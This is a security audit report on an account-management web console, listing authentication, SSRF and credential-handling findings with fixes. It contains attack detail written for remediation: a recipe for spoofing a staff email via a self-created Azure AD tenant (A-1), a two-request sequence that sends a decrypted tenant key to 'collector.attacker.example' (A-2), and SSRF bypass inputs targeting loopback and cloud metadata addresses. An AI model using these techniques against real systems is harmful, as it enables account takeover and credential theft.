# Security audit — 2026-08-29

Static security review of `account-management` at app version `0.2.1`, covering the whole
working tree rather than a diff. Findings, evidence, fixes applied, and what is still open.

> **This is a snapshot, and the tree moved under it.** The repository was being edited
> concurrently during the review — the audit-log filter, the four credential-test routes,
> `lib/audit-events.ts`, `lib/trace.ts`, `lib/modules.ts` and several components were all written
> after their first read. Everything below was **re-verified against the tree as of 18:50** on
> 2026-08-29, and §4 records where a concurrent change altered a finding. Anything written after
> that timestamp is outside this report.

- Standing controls and their rationale: [SECURITY.md](SECURITY.md)
- What has actually been exercised against live systems: [TESTING.md](TESTING.md)
- The merged traceability surface reviewed here: [INTERNAL_TRACE_MERGE.md](INTERNAL_TRACE_MERGE.md)

---

## 1. Scope and method

**Why the whole tree, not a diff.** The `origin` remote exists but nothing has ever been
pushed, and the working tree carries ~20 modified and 8 untracked files on top of two local
commits. There is no baseline to diff against, and essentially none of the code has been
reviewed before, so the review took the whole app as its unit.

**Reviewed:**

| Area | Files |
|---|---|
| Session, gate, sign-in | `lib/session.ts`, `lib/login.ts`, `lib/users.ts`, `api/auth/*` |
| Secrets | `lib/crypto.ts`, `lib/env.ts`, `.env.example`, `.gitignore`, git history |
| Data access | `lib/supabase.ts`, all 14 route handlers |
| Outbound calls | `lib/orcanos.ts`, `lib/orcanos-url.ts`, `lib/connections.ts`, `lib/provisioning.ts` |
| Merged trace surface | `lib/trace.ts`, `lib/modules.ts`, `api/accounts/trace/*`, `api/accounts/modules` |
| Client | all `src/components/*`, `src/app/*/page.tsx`, `layout.tsx`, `next.config.mjs` |
| Supply chain | `npm audit`, installed `next` / `jose` versions |

**Method.** Manual source review plus targeted executable checks: the SSRF predicate was
extracted and run against a 21-case block/allow corpus; `npm audit` was run against the
installed tree; git history and `git ls-files` were checked for committed secrets.

**Explicitly NOT done — do not read this report as covering it:**

- No dynamic testing. Nothing was exercised against the running app, the master Supabase,
  Orcanos, or the traceability instance.
- No inspection of live configuration. In particular **nobody has confirmed whether Office 365
  sign-in is enabled**, which is the precondition for finding A-1 below. The `auth_methods`
  row for `PLATFORM_ACCOUNT` decides it and was not read.
- No review of the master database's own posture (roles, RLS, network restrictions, PITR).
- No review of the Vercel project settings (env var scoping, deploy protection, team access).
- No review of the traceability-matrix or Orcanos QMS codebases, both of which share this
  app's `JWT_SECRET` and `ENCRYPTION_KEY` and are therefore in the same blast radius.

---

## 2. Findings at a glance

| # | Finding | Severity | Auth needed | Status |
|---|---|---|---|---|
| A-1 | Office 365 sign-in trusts an attacker-settable email address | **High**, conditional | none | **Closed — method disabled** |
| A-2 | Staff-settable host columns defeat the credential-pinning invariant | **Medium** | platform staff | **Open — needs a decision** (detection added mid-audit) |
| A-3 | No rate limiting or lockout on any auth route | **Medium** | none | Open |
| A-4 | No HTTP security headers — console was framable | Medium | none | **Fixed** |
| A-5 | SSRF guard missed IPv4-mapped IPv6 and CGNAT space | Low | platform staff | **Fixed (partly)** |
| A-6 | Google sign-in did not require `email_verified` | Medium | none | **Fixed** |
| A-7 | Pre-auth error detail leakage | Low | none | Open |
| A-8 | Timing-based user enumeration on local login | Low | none | Open |
| A-9 | Audit events carry no IP or user agent | Low | — | Open |
| A-10 | `npm audit`: 1 high, 1 moderate (build-time only) | Info | — | Accepted |

---

## 3. What was verified as sound

Recorded deliberately — an audit that only lists defects misrepresents the app. Each of these
was checked, not assumed:

- **The gate is applied everywhere.** All 14 privileged route handlers open with
  `requirePlatformStaff()`. There is no handler that forgets it, and none converts its 404
  to a 403. The four pre-login routes (`auth/config`, `auth/google`, `auth/office365`,
  `auth/local/login`) are the documented exceptions.
- **Authorisation is re-derived per request.** `getCurrentUser()` reads `role` and `email`
  from master `users` on every call; the JWT is used only as a pointer via `sub`. Revoking an
  admin in the database takes effect on their next request, not at token expiry.
- **No ciphertext or plaintext secret reaches the browser.** `GET /api/accounts/:id` uses an
  explicit 21-column allow-list containing zero `*_encrypted` columns; `toJobView()` strips the
  two secret columns and `payload` off a provisioning job; `/api/auth/config` returns only
  public `client_id`s. Verified column by column.
- **No secrets in the repository.** `.env.local` is ignored by `.gitignore:9` (confirmed with
  `git check-ignore -v`), is absent from `git ls-files`, and both commits in history are clean.
  `.env.example` contains only placeholders. No `NEXT_PUBLIC_` variable exists.
- **No injection into PostgREST.** Every interpolated value in a PostgREST path passes through
  `encodeURIComponent`, and `accountCiFilter()` additionally escapes the LIKE metacharacters
  `\`, `%` and `_` so an account named `a_b` cannot match `axb`. `limit`/`offset` parameters
  are coerced with `Number()` and clamped.
- **The audit-log `in.(…)` filter is safe.** Added during this audit, and checked because it is
  the one place a value is interpolated into a PostgREST filter *without* encoding. The
  `VALID_EVENT_TYPE` pattern `/^[a-z][a-z0-9_]{0,63}$/` admits no comma, parenthesis, quote, dot
  or ampersand, so no input can terminate the list or append a filter. Failing an invalid
  selection open — showing the unfiltered trail — is the right direction for an audit view.
- **No XSS sinks.** No `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function` or
  `document.write` anywhere in `src/`. All rendering goes through JSX text interpolation.
- **The crypto is correct.** AES-256-GCM with a 12-byte random nonce per encryption, the tag
  split off and set explicitly for decryption, and a hard length check that the key decodes to
  exactly 32 bytes. `generateDbPassword` uses `randomBytes`, not `Math.random`.
- **The OAuth `state` check is a hard failure.** `CallbackClient` aborts on a missing or
  mismatched `state` with no compatibility escape hatch, and the value is 24 bytes from
  `crypto.getRandomValues`.
- **CSRF is covered by `SameSite=Lax`.** All state-changing routes are POST/PUT/PATCH/DELETE,
  and the session cookie is not sent on cross-site requests with those methods. Worth knowing
  that `Request.json()` does not check `Content-Type`, so the `SameSite` flag — not the content
  type — is the control that holds here. Do not weaken it to `None`.
- **The Orcanos sign-in gate is correctly ordered.** `identity.virtualDir !== expectedVirtualDir`
  is checked *before* `Is_admin`, and both against a server-derived value. That ordering is
  what makes requiring Orcanos `Is_admin` safe; reversing it would admit any customer's own
  Orcanos administrator. `isAdminFlag()` fails closed on an unrecognised value.
- **No user enumeration in sign-in responses.** A missing `users` row, a row with no
  `orcanos_user_name`, a rejected password, a wrong tenant and a non-admin all return the
  identical `401 {"detail":"Invalid credentials"}`, each with its own distinct audit reason.
  (The timing side channel is A-8; the response bodies themselves are clean.)
- **Provisioning never rests plaintext.** Secrets typed into the create form are encrypted
  before the job row is written, and the generated Postgres password, the fetched service key
  and `payload` are all nulled when the job reaches `done`.
- **Dependencies are current.** `next@15.5.24` — well past CVE-2025-29927, the middleware
  authorization bypass, which in any case cannot apply since the project has no `middleware.ts`.
  `jose@5.10.0`.

---

## 4. Findings in detail

### A-1 · Office 365 sign-in trusts an attacker-settable email address — **High** (conditional)

**Where:** [`src/app/api/auth/office365/route.ts`](src/app/api/auth/office365/route.ts), lines 29 and 59.

**Mechanism.** Three things compound:

```ts
const tenant = config.office365_tenant || 'common';   // line 29
…
const email = profile.mail || profile.userPrincipalName;   // line 59
```

1. Falling back to `common` makes the token exchange accept an authorization code from **any**
   Azure AD tenant, including one the attacker created, as well as personal Microsoft accounts.
2. Nothing validates the `tid` (tenant id) of the resulting token, so step 1 is never caught
   downstream. The route reads the profile from Microsoft Graph and never inspects an `id_token`.
3. The identity is taken from Graph's `mail` attribute in preference to `userPrincipalName`.
   `userPrincipalName` must sit on a DNS-verified domain; **`mail` need not** — it is a
   free-text directory attribute a tenant administrator sets at will.

**Attack.** Register an Azure AD tenant (free). Create a user. Set that user's `mail` to a known
platform staff address — `zoharp@orcanos.com` is on this repo's own login screen documentation.
Complete the sign-in flow. `completeLogin()` then looks up master `users` by that email and
applies `isPlatformStaff()`: the `@orcanos.com` half now passes on an assertion the attacker
authored. The only remaining control is `users.role === 'admin'` for that exact address — which
is the account an attacker would pick in the first place.

**Impact if it lands.** Full platform-console access: every tenant's configuration, the module
licences, account deletion, and provisioning of new billable infrastructure.

**Precondition, and why this is filed as conditional.** It requires `office365_enabled = true`
on the `auth_methods` row for `PLATFORM_ACCOUNT`. That row was not read during this audit. If
Office 365 sign-in is disabled, this is latent rather than live — but it will become live the
moment someone enables it, because nothing in the code or the docs warns against `common`.

**Resolution — Microsoft sign-in was withdrawn (2026-08-29, owner decision).** The method is off,
and off in three places rather than one:

| Where | What |
|---|---|
| `lib/env.ts` | `office365SignInEnabled()` returns `false`, with the reasoning on the constant |
| `api/auth/office365` | Refuses with 403 before reading the body, and audits the attempt as `login_denied` / `method_disabled` |
| `api/auth/config` | Requires `office365_enabled && office365SignInEnabled()`, so the button does not render |

The code-level switch is the control; the master-DB `office365_enabled` flag is not, because
hiding a button does not stop a direct POST to the route, and a future operator flipping that flag
must not silently re-open this. **Setting `office365_enabled = false` on the `auth_methods` row is
still worth doing** as tidy-up, but nothing depends on it.

The vulnerable code is left in place, unfixed and unreachable, so that re-enabling forces a reading
of this finding.

**If Microsoft sign-in is ever wanted back**, all three of these are required — item 1 alone closes
the attack, but the other two are what stop it reopening:

1. Store the real Orcanos Entra tenant GUID in `auth_methods.office365_tenant` and **refuse to
   proceed when it is empty or `common`**, rather than defaulting.
2. Request `openid` (already in scope), read the `id_token` from the token response, and verify
   `tid` matches that GUID and `iss` matches `https://login.microsoftonline.com/{tid}/v2.0`.
3. Prefer `userPrincipalName` over `mail`, or require the two to agree.

**Unaffected:** Google and Orcanos email sign-in. Each method is resolved independently from the
`auth_methods` row, so withdrawing one removes its button and nothing else.

---

### A-2 · Staff-settable host columns defeat the credential-pinning invariant — **Medium**

**Where:** [`src/app/api/accounts/[id]/route.ts:50-66`](src/app/api/accounts/[id]/route.ts#L50-L66)
(`PATCHABLE`), [`src/lib/connections.ts:44-48`](src/lib/connections.ts#L44-L48),
[`src/lib/orcanos.ts`](src/lib/orcanos.ts) (`orcanosTestLogin` fallback).

**Mechanism.** `SECURITY.md` §5 states the invariant plainly, and the code honours it as
written: when `POST /api/orcanos/test-login` falls back to a stored password, it also pins the
URL to that account's own saved `orcanos_api_url`, so "a decrypted secret is never sent to a
client-chosen host."

But `orcanos_api_url`, `vector_db_host` and `orcanos_db_host` are all in `PATCHABLE`. The host
*is* client-chosen — one API call earlier.

**Attack**, from an authenticated staff session:

```
PATCH /api/accounts/:id   { "vector_db_host": "https://collector.attacker.example" }
POST  /api/accounts/:id/test-connections
```

`testVectorConnection` decrypts `vector_db_password_encrypted` — that tenant's Supabase
**`service_role` key** — and sends it to the supplied host as both `apikey` and
`Authorization: Bearer`. The same two steps yield the Orcanos REST password over HTTP Basic
(via `orcanos_api_url` and `POST /api/orcanos/test-login` with no password in the body) and the
SQL Server password (via `orcanos_db_host`, or `orcanos_connection_string` parsed by
`parseOdbc`). `testVectorCore` applies no `isSafeExternalUrl` check at all, and passes an
arbitrary `connection_string` straight into `pg.Client`.

**Impact.** Converts "has an admin session" into "plaintext copy of every tenant's customer
credentials" — which is precisely the outcome the encryption-at-rest design and the no-ciphertext-
to-the-browser rule exist to prevent. It is the escalation path behind any stolen session or
compromised staff account.

**Honest framing.** This needs an authenticated platform administrator, who is already trusted
with the tenant data itself. It is an insider / session-theft finding, not a remote one. It is
reported because the app's own threat model treats the secret boundary as load-bearing, and
this crosses it.

**Partial mitigation added during this audit (by concurrent work, not by me).** Both test routes
now write a `security_audit_log` event on every credential *use*, not only on change:
`account_credentials_tested` from `api/accounts/:id/test-connections`, and
`orcanos_login_tested` from `api/orcanos/test-login` — the latter recording
`used_stored_credential` and the `api_url` the secret actually reached. That is a real
improvement: the attack above now leaves a trail naming the collector host.

It is **detection, not prevention**, and it changes nothing about the mechanism. Re-verified
against the current tree: `orcanos_api_url`, `vector_db_host` and `orcanos_db_host` are still in
`PATCHABLE`, and `testVectorConnection` still applies no host check before sending the decrypted
`service_role` key. The fix below is still required. Detection also only pays off if something
reads the trail — see A-9 and the A.8.16 row in §8.

**Recommended fix** (needs your input on which shape you want):

- Run `isSafeExternalUrl()` on the stored host before any decrypted secret is sent to it —
  closes internal probing but not exfiltration to a public collector; or
- Treat a change to a host column as invalidating the paired stored secret, so a
  re-test after a host change requires the operator to re-supply the password (the same
  "test before you save" discipline the vector key already has); or
- Both. Recommended.

Whichever is chosen, log a `security_audit_log` event when a host column changes — today the
`account_updated` event records the field name, which is enough to detect this after the fact
provided anyone is looking.

---

### A-3 · No rate limiting or lockout on any auth route — **Medium**

**Where:** [`src/app/api/auth/local/login/route.ts`](src/app/api/auth/local/login/route.ts);
absence of `middleware.ts` and `vercel.json` anywhere in the project.

**Mechanism.** `POST /api/auth/local/login` proxies straight through to Orcanos `QW_Login`.
There is no throttle, no backoff, no lockout, no CAPTCHA and no per-IP accounting, at any layer.

**Impact.** An unauthenticated password-guessing oracle against your Orcanos tenant, hosted on
your own console's domain and therefore not subject to whatever protections Orcanos itself
applies at its own edge. Secondarily, an unmetered outbound-request amplifier: each attempt
costs a Vercel function invocation with a 20-second budget.

`SECURITY.md` §8 offers the audit trail as the compensating control ("failed and denied
sign-ins are recorded … which is what makes brute-force attempts visible"). That claim does not
currently hold up — see A-9: the events carry no IP and no user agent, so an attack is visible
as a count but not attributable, and nothing alerts on it.

**Recommended fix.** A per-IP and per-email limiter in front of the auth routes — Vercel
Firewall rate limiting is the lowest-friction option and needs no code. Add a short lockout
after N consecutive failures for the same email. Pair with A-9.

---

### A-4 · No HTTP security headers — **Medium** — ✅ **Fixed**

**Where:** [`next.config.mjs`](next.config.mjs). No `headers()` and no `vercel.json` existed.

**Mechanism.** Nothing set `frame-ancestors` or `X-Frame-Options`, so the console could be
framed by any origin. The destructive actions in this UI are one click each — Delete account,
and the module licence toggles — which is the classic clickjacking target.

Also absent: `nosniff`, a `Referrer-Policy` (so the full console URL travelled in `Referer` to
Google Fonts on every page load), and `Permissions-Policy`.

**Fixed** by adding a `headers()` block covering every route. See §5 below.

**Still open, deliberately:** this is not a full CSP. `script-src` needs a nonce integration
with Next's inline bootstrap script; bolting on a `script-src` blind would break the app. That
matters more than usual here because the argument for the httpOnly cookie in `SECURITY.md` §2
is explicitly "an XSS bug cannot exfiltrate the token" — true for the token, but an XSS bug
would still act as the admin inside the page. A real CSP is the second half of that defence.

---

### A-5 · SSRF guard missed IPv4-mapped IPv6 and CGNAT space — **Low** — ✅ **Fixed (partly)**

**Where:** [`src/lib/orcanos.ts`](src/lib/orcanos.ts), `isSafeExternalUrl()`.

**Mechanism.** The guard enumerated private IPv4 ranges with a dotted-quad regex. `new URL()`
normalises `http://[::ffff:127.0.0.1]/` to hostname `[::ffff:7f00:1]` — a hex spelling the
regex never matched, so it fell through every private-range check and returned `true`.
Confirmed by extracting and running the predicate. `100.64.0.0/10` (carrier-grade NAT, used by
several cloud internal fabrics), `192.0.0.0/24` and `198.18.0.0/15` were also unlisted.

Worth recording what was **not** a bypass: the decimal, octal and short IPv4 forms
(`http://2130706433/`, `http://0177.0.0.1/`, `http://127.1/`) are all normalised to
`127.0.0.1` by `new URL()` before the guard sees them, and were correctly blocked.

**Reachability.** `POST /api/orcanos/test-login` is behind `requirePlatformStaff()`, so this is
staff-only — hence Low.

**Fixed** for hostname parsing; see §5 below.

**Still open, deliberately:** `fetch` follows redirects by default, so a public host can answer
`302 Location: http://169.254.169.254/…` and reach inside. Setting `redirect: 'manual'` would
close it but would also break any real Orcanos endpoint that redirects, and this is a staff-only
path — breaking a working production integration is the worse outcome. Recorded here rather than
changed. `SECURITY.md` §5's existing position — egress filtering is the control for what the URL
string cannot tell you — covers this and the accepted DNS gap.

---

### A-6 · Google sign-in did not require `email_verified` — **Medium** — ✅ **Fixed**

**Where:** [`src/app/api/auth/google/route.ts`](src/app/api/auth/google/route.ts).

**Mechanism.** The route read `profile.email` from Google's OIDC userinfo endpoint and passed
it to `completeLogin()` without checking the accompanying `email_verified` claim. A Google
account created around a third-party address carries `email_verified: false` until confirmed,
and Google's own OIDC guidance is explicit that the claim must be checked before an email is
treated as an identity. Here the email domain is half the platform gate, so an unverified claim
was being used as proof of domain membership.

Weaker in practice than A-1 — Google Workspace accounts are always verified — but it is the
same class of defect, and it costs one comparison to close.

**Fixed** — see §5 below.

---

### A-7 · Pre-auth error detail leakage — **Low**

**Where:** [`src/app/api/auth/config/route.ts:28`](src/app/api/auth/config/route.ts#L28);
the `catch` blocks in `api/auth/google` and `api/auth/office365`.

`/api/auth/config` is reachable unauthenticated and returns
`Could not read auth configuration: ${e.message}`, where `PostgrestError` formats as
`Supabase ${status}: ${body.slice(0,300)}` — leaking master-DB table names and PostgREST error
codes to anyone who asks. The OAuth routes similarly return up to 200 characters of the
provider's raw error body on a failed exchange.

**Fix.** Return a fixed message, log the detail with `console.error`. Keep the specific messages
for the authenticated routes, where they are genuinely useful.

---

### A-8 · Timing-based user enumeration on local login — **Low**

**Where:** [`src/app/api/auth/local/login/route.ts:45-90`](src/app/api/auth/local/login/route.ts#L45-L90).

The response bodies are uniform (see §3), but the work is not: a `users` row that is missing, or
present without `orcanos_user_name`, returns 401 immediately after one PostgREST read, whereas a
linked row triggers a `QW_Login` round trip on a 20-second budget. The difference is trivially
measurable and enumerates which platform staff addresses are Orcanos-linked.

**Fix.** Low priority. If it is worth closing, normalise the response time on the fast path.

---

### A-9 · Audit events carry no IP or user agent — **Low**

**Where:** [`src/lib/audit.ts:23-30`](src/lib/audit.ts#L23-L30).

The row written is `event_type`, `account_name`, `actor_user_id`, `actor_email`, `success`,
`detail`. There is no client IP (`x-forwarded-for` on Vercel), no user agent, and no request id.

Re-verified after the concurrent work that expanded event *coverage* (§4, A-2): `lib/audit.ts`
itself is unchanged, so the trail now records more events but each one still cannot say where it
came from.

Two consequences. Operationally, it undercuts the compensating control claimed for A-3 — a
brute-force attempt is a row count, not something you can block or attribute. For compliance,
it thins the A.8.15 evidence: the trail answers *what* and *who claimed to be whom*, but not
*from where*, which is the field an investigation starts from.

**Fix.** Add `ip` and `user_agent` to the `security_audit_log` insert, read from the request
headers. Needs a coordinated column addition since Orcanos QMS writes the same table.

---

### A-10 · Dependency audit — **Info** — accepted

`npm audit` over the installed tree (148 dependencies): **1 high, 1 moderate, 0 critical.**

Both are the same root cause — `postcss <= 8.5.22`, reached transitively through Next's build
tooling, with advisories for XSS via an unescaped `</style>` in stringify output and arbitrary
file read via attacker-controlled source-mapping comments.

**Accepted.** PostCSS runs at build time over CSS authored in this repository. Neither advisory
is reachable at runtime and neither processes untrusted input. Revisit at the next Next.js
upgrade rather than forcing a resolution now.

---

## 5. Changes applied by this audit

Three fixes, chosen on one rule: **no behavioural risk to a legitimate user.** Anything that
could lock out a real operator, or break a working production integration, was written up
instead of changed. `npx tsc --noEmit` passes. Nothing was committed or pushed.

| File | Lines | What |
|---|---|---|
| `src/lib/orcanos.ts` | +142 −8 | SSRF guard hardening (A-5) |
| `next.config.mjs` | +34 | Security headers (A-4) |
| `src/app/api/auth/google/route.ts` | +15 −2 | `email_verified` requirement (A-6) |

**`src/lib/orcanos.ts`.** `isSafeExternalUrl()` gains two helpers. `asIpv4()` resolves a
hostname to a dotted quad when it is one, including the IPv4-mapped IPv6 spellings that URL
normalisation produces; `isPrivateIpv4()` holds the range list, now extended with
`100.64.0.0/10`, `192.0.0.0/24`, `198.18.0.0/15` and multicast. The doc comment records the two
residual limits — no DNS resolution, no redirect following — so the next reader does not
mistake the function for complete.

Verified against a 21-case corpus: 14 addresses that must be blocked, including
`[::ffff:127.0.0.1]`, `[::ffff:169.254.169.254]` and `100.64.1.5`; and 7 that must still be
allowed, including the real `app.orcanos.com` and `us.orcanos.com` Orcanos URLs and the
near-miss ranges `172.32.5.5`, `192.169.1.1` and `100.128.0.1`. All 21 correct.

**`next.config.mjs`.** A `headers()` block on `/:path*` sending
`Content-Security-Policy: frame-ancestors 'none'`, `X-Frame-Options: DENY`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
a minimal `Permissions-Policy`, and HSTS at two years with `includeSubDomains`.
`frame-ancestors` is sent as CSP because that is the directive modern browsers honour;
`X-Frame-Options` stays for anything that does not read CSP. Deliberately not a full CSP — see
A-4.

**`src/app/api/auth/google/route.ts`.** Rejects the sign-in when `email_verified !== true`,
with a comment explaining why the claim is load-bearing for this app specifically. Google
Workspace accounts always set it, so no legitimate staff member is affected.

---

## 6. Outstanding actions

Ordered by what should happen first.

| # | Action | Owner decision needed |
|---|---|---|
| ~~1~~ | ~~Read the `auth_methods` row and record whether `office365_enabled` is true.~~ Moot — the method is now off in code either way. Still worth setting the flag to `false` as tidy-up. | Done |
| ~~2~~ | ~~Close A-1.~~ **Done** — Microsoft sign-in withdrawn, see A-1. | Done |
| 3 | Close A-2: host-check, secret-invalidation, or both. | **Yes** — which shape |
| 4 | Close A-3: rate limiting in front of the auth routes. | Vercel Firewall vs in-code |
| 5 | Close A-9: add `ip` and `user_agent` to `security_audit_log`. Coordinate with Orcanos QMS, which writes the same table. | Coordinate |
| 6 | Close A-7: generic pre-auth error messages. | No |
| 7 | Add a real CSP with a nonce for Next's inline bootstrap (second half of A-4). | No |
| 8 | A-8, and the `redirect: 'manual'` half of A-5 — both low, both carry a small regression risk. Batch them with the next change to those files. | No |

---

## 7. Re-test checklist after any of the above

Extends the short regression loop in `CLAUDE.md` → *Testing*, and assumes the fixes already
applied are in place:

1. `npx tsc --noEmit` and `npx next build`.
2. Sign in with Google — must still succeed for a real `@orcanos.com` staff account (confirms
   the A-6 fix did not over-reject).
3. `curl -sI https://<deployment>/login` — confirm the six headers from A-4 are present.
4. In a scratch page, attempt to `<iframe>` the console — must be refused.
5. *Test API* on an existing account with a saved password — must still connect (confirms the
   A-5 hardening did not reject a real Orcanos host).
6. `POST /api/orcanos/test-login` with `api_url: "http://[::ffff:127.0.0.1]/"` — must return
   `"API URL is not an allowed external address"`.
7. `GET /api/accounts` while signed out → **404**, not 403.
8. `/audit` shows the events produced by steps 2 and 5.

---

## 8. ISO 27001:2022 control notes

Where this audit touches the controls `SECURITY.md` already claims. Not a certification
assessment — an engineering note on which findings carry compliance weight.

| Control | Bearing |
|---|---|
| A.5.15 Access control | Sound. The gate is uniformly applied and re-derived per request (§3). A-1 and A-2 are both failures of *identity assurance* feeding a sound authorisation model, not failures of the model. |
| A.5.17 Authentication information | A-1 (identity claim not verified), A-6 (fixed), A-3 (no protection against credential guessing). |
| A.8.5 Secure authentication | A-3 is the direct gap — no lockout, no rate limit, no MFA requirement expressed anywhere in this app. |
| A.8.15 Logging | Trail exists and is continuous across both apps, but see A-9: no source attribution. Also note `TESTING.md` — the table was created 2026-08-29 and **nothing before that date was ever recorded**. |
| A.8.16 Monitoring | Effectively absent. Events are written; nothing reads or alerts on them. A-3's compensating control depends on this and does not currently exist. |
| A.8.24 Cryptography | Sound (§3). The single shared `ENCRYPTION_KEY` across all tenants remains an accepted risk (`SECURITY.md` §9). |
| A.8.28 Secure coding | Sound. No injection, no XSS sinks, explicit column allow-lists, dependencies current. |

---

*Static review. No dynamic testing was performed, and the live configuration that determines
A-1's severity was not inspected — see §1.*
